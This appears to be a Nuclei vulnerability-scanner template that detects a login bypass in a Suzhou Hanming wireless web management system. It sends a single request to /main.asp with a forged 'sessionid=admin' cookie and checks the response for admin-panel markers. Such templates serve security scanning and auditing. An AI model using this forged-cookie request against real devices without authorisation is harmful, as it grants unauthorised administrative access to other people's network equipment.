id: hamming-login-bypass

info:
  name: Login Bypass for Hamming Wireless Management Controller
  author: ProjectDiscoveryAI
  severity: high
  description: |
    Suzhou Hanming Technology Co., Ltd.'s Wireless Web Management System has a login bypass vulnerability allowing attackers to access sensitive information.
  reference:
    - http://www.hanmingtech.com/
  tags: permission-bypass, login-bypass

http:
  - raw:
      - |
        GET /main.asp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Cookie: sessionid=admin
        Accept-Encoding: gzip, deflate
        X-Requested-With: XMLHttpRequest

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "top_logo.asp"
          - "left_menu.asp"
          - "mainFrame"
